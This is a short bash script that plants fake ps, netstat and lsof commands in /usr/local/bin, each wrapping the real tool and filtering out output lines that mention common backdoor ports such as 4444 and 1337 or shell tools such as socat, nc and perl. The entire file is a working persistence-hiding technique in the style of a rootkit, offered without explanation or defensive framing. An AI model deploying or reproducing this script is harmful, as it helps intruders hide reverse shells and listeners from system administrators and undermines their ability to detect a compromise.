#!/bin/bash

#ps
#------------------------
sudo touch /usr/local/bin/ps

sudo cat <<EOF >> /usr/local/bin/ps	
#!/bin/bash
/bin/ps \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

sudo chmod +x /usr/local/bin/ps

#netstat
#------------------------
sudo touch /usr/local/bin/netstat

sudo cat <<EOF >> /usr/local/bin/netstat
#!/bin/bash
/bin/netstat \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

sudo chmod +x /usr/local/bin/netstat

#lsof
#------------------------
sudo touch /usr/local/bin/lsof

sudo cat <<EOF >> /usr/local/bin/lsof
#!/bin/bash
/usr/bin/lsof \$@ | grep -Ev '4444|3177|1177|1337|19526|socat|LEGO|nc|perl'
EOF

sudo chmod +x /usr/local/bin/lsof
